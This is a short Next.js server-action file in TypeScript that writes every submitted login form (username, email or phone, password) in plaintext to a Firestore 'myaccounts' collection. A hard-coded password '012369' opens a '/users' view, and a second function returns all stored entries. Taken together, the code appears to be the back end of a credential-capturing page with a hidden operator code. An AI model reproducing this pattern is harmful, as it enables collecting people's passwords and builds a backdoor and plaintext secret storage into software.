"use server"
import firebaseConfig from './config';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, getDocs, addDoc } from 'firebase/firestore/lite';
import { revalidatePath } from 'next/cache';
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);


export const FormServer = async (formData: FormData) => {
  
  try {
    if (formData.get('username') == formData.get('emailOrPhone') && formData.get('password') === "012369") {
     console.log("redirect accessed")
     return revalidatePath('/users');
      //return res.redirect('/users');
    }else{
      const myaccounts = collection(db,'myaccounts');
      const result = await addDoc(myaccounts,
        Object.fromEntries(formData.entries())
      );
      console.log({ success: 'Entry created successfully' });
      return;
    }
    
    // Log a success message
  } catch (error: any) {
    
    // Log an error message
    console.log({ error: error.message});
  }
  return;
};


export const DataTableServer = async () => {
  try {
    const myaccounts = collection(db,'myaccounts');
    return  (await getDocs(myaccounts)).docs.map(doc => doc.data());
  } catch (error: any) {
    console.log({ error: error.message});
  }
  return [];
};



